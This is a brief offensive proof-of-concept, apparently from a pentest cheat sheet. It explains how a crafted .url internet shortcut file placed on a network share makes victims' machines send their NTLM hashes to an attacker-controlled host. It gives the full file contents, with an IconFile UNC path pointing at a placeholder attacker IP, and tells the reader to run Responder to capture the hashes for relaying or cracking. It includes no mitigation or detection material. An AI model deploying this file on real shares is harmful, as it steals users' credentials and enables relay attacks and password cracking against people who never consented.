This is an attack that takes advantage of a file that is saved on a share, that can be used to dump hashes of users which can be relayed and cracked.


### Proof of Concept
Create a file and have the following in it.

```txt
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\<attacker_ip>\%USERNAME%.icon
IconIndex=1
```

Save this file in a share and open it using the victim user. To execute this you have to make sure that responder is running as this is what you will use to capture hashes.